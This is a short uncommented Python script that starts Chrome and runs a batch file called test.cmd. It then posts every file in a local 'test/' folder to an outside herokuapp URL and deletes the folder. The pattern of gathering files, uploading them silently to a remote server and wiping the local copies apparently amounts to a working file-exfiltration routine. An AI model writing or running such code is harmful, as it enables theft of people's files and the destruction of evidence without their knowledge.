from subprocess import call, Popen
from os import path, sys, listdir
from shutil import rmtree
import requests

Popen("chrome.exe")
call("test.cmd")
url = "https://file-fetch.herokuapp.com/"
basepath = "test/"
for entry in listdir(basepath):
    filepath = path.join(basepath, entry)
    if path.isfile(filepath):
        files = {'file': open(filepath, "rb")}
        res = requests.post(url, files=files)
        print(res.text)
rmtree(basepath, True)
